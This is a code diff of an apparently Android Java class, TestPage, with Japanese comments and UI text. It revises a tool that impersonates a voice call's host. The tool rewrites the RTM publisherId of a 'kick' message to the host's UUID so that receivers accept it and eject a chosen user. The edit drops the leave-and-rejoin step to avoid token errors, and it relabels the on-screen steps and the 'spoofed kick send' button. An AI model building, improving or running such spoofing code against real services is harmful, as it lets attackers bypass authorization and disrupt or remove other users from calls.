@@ -441,10 +441,10 @@ public class TestPage {
      * 攻撃手順:
      *  1. ホストUUIDを取得（uuidMap逆引き）
      *  2. spoofPublisherId=true + spoofPublisherUuid=hostUuid をセット
-     *  3. 通話を一度退出→再参加 → joinChannelWithUserAccount の userAccount が
-     *     ホストUUIDに差し替えられ、RTMチャンネルにホストとして参加する
-     *  4. kick <targetUuid> <ts> <sig> を送信
-     *     → 受信側: event.getPublisherId() == hostUuid → チェック通過 → キック成立
+     *  3. ④kick送信ボタンを押す → sendCommand で kick コマンド送信する直前に
+     *     RTM publish メッセージの publisherId フィールドをホストUUIDに書き換える
+     *     ※ joinChannelWithUserAccount は触らないのでトークンエラー不発生
+     *  4. 受信側: event.getPublisherId() == hostUuid → チェック通過 → キック成立
      *
      * ※ 署名(ts/sig)は CallApi.requestKickSignature で取得する
      *   （サーバー側に role チェックがあれば失敗する可能性あり）
@@ -455,7 +455,8 @@ public class TestPage {
         TextView desc = new TextView(activity);
         desc.setText(
                 "RTMのpublisherIdをホストUUIDに偽装してkickを送信\n"
-                + "手順: ①ホストUUID取得 → ②偽装フラグON → ③退出/再参加 → ④kick送信\n"
+                + "手順: ①ホストUUID取得 → ②偽装フラグON → ③kick送信\n"
+                + "（退出/再参加不要・トークンエラーなし）\n"
                 + "受信側: event.getPublisherId()==hostUuid → チェック通過");
         desc.setTextColor(Color.argb(180, 255, 200, 200));
         desc.setTextSize(9);
@@ -485,7 +486,7 @@ public class TestPage {
             StateHolder.spoofPublisherId   = true;
             refreshSpoofStatus(statusLabel);
             appendResult("[Spoof] ✅ 偽装フラグON: " + hostUuid);
-            appendResult("[Spoof] 次に通話を退出→再参加してください");
+            appendResult("[Spoof] 次に③偽装kick送信を押してください（退出不要）");
         });
 
         TextView clearSpoofBtn = makeSmallBtn(activity, "フラグOFF", Color.argb(255, 80, 80, 80));
@@ -504,7 +505,7 @@ public class TestPage {
         LinearLayout row2 = makeHorizontalRow(activity);
 
         TextView spoofKickBtn = UIHelper.makeMuteActionBtn(activity,
-                "④偽装kick送信（選択対象）", Color.argb(255, 180, 40, 40));
+                "③偽装kick送信（選択対象）", Color.argb(255, 180, 40, 40));
         spoofKickBtn.setOnClickListener(v -> {
             if (selectedTargetUuid.isEmpty()) {
                 appendResult("[Spoof] ❌ 対象を選択してください");
